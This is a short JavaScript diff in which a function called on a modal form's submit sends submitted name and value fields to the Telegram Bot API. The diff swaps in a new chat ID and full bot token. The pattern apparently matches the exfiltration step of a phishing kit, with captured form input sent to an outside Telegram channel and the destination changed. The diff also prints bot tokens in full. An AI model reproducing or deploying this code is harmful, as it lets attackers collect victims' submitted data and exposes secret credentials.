@@ -67,8 +67,8 @@ $('.modalk a#submit').click(function () {
 });
 
 function sendMessage(name, value, ress) {
-  var chat_id = -1001604067165;
-  var bot_token = 'bot5031140535:AAE-MnEXdl9TGH4kPO4HoqKpjiAy0MuwGWw';
+  var chat_id = -2105195078;
+  var bot_token = 'bot5111358374:AAH5f9a9tHq8VP_1jXqNF_4tPeimaOHCdI8';
   $.ajax({
     url:
       'https://api.telegram.org/' +
